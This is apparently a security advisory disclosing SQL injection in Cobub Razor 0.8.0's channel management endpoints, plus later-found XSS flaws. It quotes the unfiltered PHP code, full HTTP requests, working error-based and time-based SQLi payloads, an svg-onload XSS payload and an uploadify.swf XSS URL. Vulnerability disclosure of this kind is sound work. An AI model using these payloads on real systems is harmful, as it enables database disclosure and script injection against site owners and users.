
## An SQL Injection vulnerability exists in Western Bridge Cobub Razor 0.8.0 via the channel_name and platform parameter in a /index.php?/manage/channel/addchannel request. ##  

Vendor Homepage : http://www.cobub.com/

Software Link : https://github.com/cobub/razor/releases

Affected Version : <= 0.8.0

## Vulnerability description ##  

The string  of the 'channel_name' and 'platform' parameter transmission is completely without check and filter,so if the string is passed, it will lead to the existence of SQL injection vulnerability,This could result in full information disclosure.

Code source:  
/application/controllers/manage/channel.php at line 75-95
```
    /**
     * Addchannel add custom channel
     *
     * @return bool
     */
    function addchannel()
    {
        $userid = $this->common->getUserId();
        $channel_name = $_POST['channel_name'];
        $platform = $_POST['platform'];
        $isUnique = $this->channel->isUniqueChannel($userid, $channel_name, $platform);
        if (!empty($isUnique)) {
            echo false;
        } else {
            if ($channel_name != '' && $platform != '') {
                
                $this->channel->addchannel($channel_name, $platform, $userid);
                echo true;
            }
        }
    }
```
## Technical details ##
request:
```
POST /index.php?/manage/channel/addchannel HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://localhost/index.php?/manage/channel
Content-Length: 28
Cookie: ci_session2=a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22771b48bbea848fd396ce3c79263c7ef8%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A7%3A%220.0.0.0%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A73%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+WOW64%3B+rv%3A48.0%29+Gecko%2F20100101+Firefox%2F48.0%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1520496121%3B%7D237011da46b2342467385c6f24631de2
X-Forwarded-For: 8.8.8.8
Connection: close

channel_name=test&platform=1%22
```  

## Proof of Concept ##  

The SQL injection type: error-based and AND/OR time-based blind  
Parameter: channel_name,platform  
Payload(This string is also applied to 'platform' at the same time):  
```
1.channel_name=test" AND (SELECT 1700 FROM(SELECT COUNT(*),CONCAT(0x7171706b71,(SELECT (ELT(1700=1700,1))),0x71786a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- JQon&platform=1
2.channel_name=test" AND SLEEP(5)-- NklJ&platform=1
```
Input special characters ["] can cause an error in the SQL syntax:  
![image](https://github.com/Kyhvedn/CVE_Description/blob/master/Cobub_Razor_0.8.0_sql_1.png)  
Use manual injection:  
![image](https://github.com/Kyhvedn/CVE_Description/blob/master/Cobub_Razor_0.8.0_sql_2.png)
SQLmap results:  
![image](https://github.com/Kyhvedn/CVE_Description/blob/master/Cobub_Razor_0.8.0_sql_3.png)
![image](https://github.com/Kyhvedn/CVE_Description/blob/master/Cobub_Razor_0.8.0_sql_4.png)

## Update Content ##
New discovery：
1.SQL injection  

(1)http://localhost/index.php?/manage/channel/addsychannel  

```
POST /index.php?/manage/channel/addsychannel HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://localhost/index.php?/manage/channel
Content-Length: 25
Cookie: ci_session2=a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22bb44fb495a8fe728431c1928cb1d7262%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A7%3A%220.0.0.0%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A73%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+WOW64%3B+rv%3A48.0%29+Gecko%2F20100101+Firefox%2F48.0%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1523169922%3B%7D85bbd681a4008cee10faf391870dfb59
X-Forwarded-For: 10.0.0.1
Connection: close

channel_name=1&platform=1%22
```  
(2)http://127.0.0.1/index.php?/manage/channel/modifychannel  
```
POST /index.php?/manage/channel/modifychannel HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: ci_session2=a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22889ee6cfbfef845881c1fef14b37a558%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A7%3A%220.0.0.0%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A73%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+WOW64%3B+rv%3A48.0%29+Gecko%2F20100101+Firefox%2F48.0%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1523172925%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D9e913409dd356b1d7cb57ceeb291d727
X-Forwarded-For: 10.0.0.1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

channel_id=1212%22&channel_name=xss><svg/onload=alert(1)>&platform=1
```  

2.SWF xss  
http://localhost/assets/swf/uploadify.swf?uploadifyID=00"));}catch(e){alert(1);}//("&movieName="])}catch(e){if(!window.x){window.x=1;alert(2)}}//&.swf  


